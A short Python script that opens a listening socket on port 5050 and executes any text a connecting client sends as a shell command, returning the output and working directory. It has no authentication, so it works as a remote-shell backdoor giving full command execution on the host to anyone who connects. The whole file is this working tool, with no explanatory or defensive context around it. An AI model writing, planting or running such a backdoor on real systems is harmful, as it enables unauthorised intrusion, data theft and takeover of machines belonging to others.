import socket
import subprocess
import os

host = ""
port = 5050
all_connections = []
all_address = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)


def accept_client():
    for i in all_connections:
        i.close()
    del all_connections[:]
    del all_address[:]

    while True:

        if not all_connections:
            conn, addr = s.accept()
            conn.send(str.encode(addr[0]))
            all_connections.append(conn)
            all_address.append(addr)

        data = conn.recv(1024)

        if len(data) > 0:
            # create a cmd window which execute our command, shell, standard output, input, error stream
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,
                                    stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            if data[:2].decode('utf-8') == 'cd':
                os.chdir(data[3:].decode('utf-8'))  # change directory

            if data.decode('utf-8') == 'quit':
                del all_connections[:]
                del all_address[:]


            # read and send response to the server
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')  # convert into str
            currentWD = os.getcwd() + ">"  # display current directory
            conn.send(str.encode(output_str + currentWD))
            

accept_client()

